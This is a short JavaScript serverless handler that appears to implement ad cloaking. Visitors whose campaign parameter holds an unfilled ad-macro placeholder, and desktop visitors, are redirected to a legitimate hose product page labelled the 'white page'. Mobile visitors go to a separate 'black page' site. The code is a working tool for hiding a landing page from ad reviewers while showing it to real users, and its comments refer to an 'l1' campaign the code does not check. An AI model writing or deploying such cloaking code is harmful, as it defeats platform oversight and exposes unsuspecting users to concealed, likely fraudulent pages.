export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://hermie.com/en/201801605/tricoflex-ultramax-hose-oe-12.5-mm-15-meters?_gl=1*aovlhj*_up*MQ..*_ga*MjEzMTUzNzgxMS4xNzYxMzE3OTMw*_ga_KVFHXQ4JJP*czE3NjEzMTc5MjkkbzEkZzAkdDE3NjEzMTc5MjkkajYwJGwwJGgw*_ga_QRG887PN7R*czE3NjEzMTc5MjkkbzEkZzAkdDE3NjEzMTc5MjkkajYwJGwwJGg5Njg2Mzc2NTk.*_ga_TFG74JX745*czE3NjEzMTc5MzAkbzEkZzAkdDE3NjEzMTc5MzAkajYwJGwwJGg2NjQxNTUwMTU.";
    const blackPageURL = "https://nowhereher.lovable.app/";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }











